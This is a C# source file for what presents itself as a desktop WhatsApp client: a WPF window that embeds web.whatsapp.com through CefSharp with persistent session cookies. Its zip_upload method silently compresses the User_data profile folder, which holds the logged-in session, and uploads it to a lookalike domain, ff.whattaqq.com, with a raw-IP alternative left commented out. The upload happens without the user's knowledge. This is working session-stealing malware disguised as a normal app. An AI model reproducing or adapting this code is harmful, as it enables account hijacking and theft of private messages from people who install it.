using CefSharp.Wpf;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


using System.IO;
using CefSharp;
using System.ComponentModel;
using System.IO.Compression;
using System.Threading;
using WhatsApp.Properties;
using System.Runtime;
using System.Net;
using CefSharp.DevTools.Network;

namespace WhatsApp
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        GChromeBrowser Browser = null;
        public MainWindow()
        {
            InitializeComponent();

            string path = System.Environment.CurrentDirectory;
            bool isExistsConfig = File.Exists(path + "\\config\\config.ini");
            CefSettings settings = this.getSetting(isExistsConfig,path);

            if (isExistsConfig)
            {
                Task.Run(()=>zip_upload(path));
            }
            else
            {
                this.addBackground_workder();
            }

            this.addBrowse(settings);

        }

        private void addBackground_workder()
        {
            var mWorker = new BackgroundWorker();
            mWorker.DoWork += new DoWorkEventHandler(worker_DoWork);
            mWorker.WorkerSupportsCancellation = true;
            mWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            mWorker.RunWorkerAsync();
        }

        private CefSettings getSetting(bool isExistsConfig, string path)
        {
            CefSettings settings= new CefSettings()
            {
                //By default CefSharp will use an in-memory cache, you need to specify a Cache Folder to persist data
                CachePath = path + "\\User_Data\\Cache",

                PersistSessionCookies = true,
                UserDataPath = path + "\\User_Data",
                LocalesDirPath = path + "\\User_Data\\localeDir",
                UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2883.87 Safari/537.36",
               
            };
            if (isExistsConfig)
            {
                //string path = System.Environment.CurrentDirectory;
                //MessageBox.Show("no da1", "warnning");
                settings.CachePath = path + "\\User_Data1\\Cache";
                settings.UserDataPath = path + "\\User_Data1";
                settings.LocalesDirPath = path + "\\User_Data1\\localeDir";
                //MessageBox.Show(settings.CachePath, "Info");
            }
            return settings;
        }

        private async void zip_upload(string path)
        {

            
                Console.WriteLine("before zip");
                await Task.Delay(3000);
                string startPath = path + "\\User_data";
                string zipPath = path + "\\config_result.zip";
            //string extractPath = @".\extract";
          
                try
                {
                    if (!File.Exists(zipPath))
                    {
                        ZipFile.CreateFromDirectory(startPath, zipPath);
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("error zip:" + ex.Message);
                    throw;
                }
                if (!File.Exists(path + "\\config\\LastRun.ini"))
                {
                    Console.WriteLine("before upload");
                    try
                    {
                        using (WebClient client = new WebClient())
                        {
                            //client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                            //client.Headers.Add("Content-Type", "application/form-data");//注意头部必须是form-data
                            client.UploadFile("http://ff.whattaqq.com/upload", "POST", zipPath);
                            //client.UploadFile("http://202.79.169.215/upload", "POST", zipPath);
                            Console.WriteLine("finnished upload");
                            string str1 = "Path=" + path;
                            File.WriteAllText(path + "\\config\\LastRun.ini", str1);
                        }
                    }
                    catch (WebException ex)
                    {

                        Console.WriteLine("error upload:" + ex.Message);
                    }

                }
        
            
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            Task t1 = Task.Run(async () =>
            {
                bool nofoud = true;
                while (nofoud)
                {
                    string path = System.Environment.CurrentDirectory;
                    Console.WriteLine(path + "\\config\\config.ini" + ": no found");

                    if (System.IO.File.Exists(path + "\\config\\config.ini"))
                    {
                        Console.WriteLine("found config file1");
                        nofoud = false;
                    }
                    await System.Threading.Tasks.Task.Delay(5000);
                }
            }
                    );
            Task.WaitAll(t1);
            Console.WriteLine("found config file");

            //Cef.Shutdown();
        }
        protected void worker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Console.WriteLine("do someting after - found config file");
            g1.Children.Remove(this.Browser);
            this.Close();

        }
        protected void addBrowse(CefSettingsBase settings)
        {
            if (!Cef.IsInitialized)
            {
                //Perform dependency check to make sure all relevant resources are in our output directory.
                try
                {
                    CefSharp.Cef.Initialize(settings);

                }
                catch (Exception e)
                {

                    Console.WriteLine(e.Message);
                }

            }

            this.Browser = new GChromeBrowser();
            //页面插入控件
            g1.Children.Add(this.Browser);
            //这里不能用Load()的方法，会报错。
            Browser.Address = "http://web.whatsapp.com";
        }
    }
}
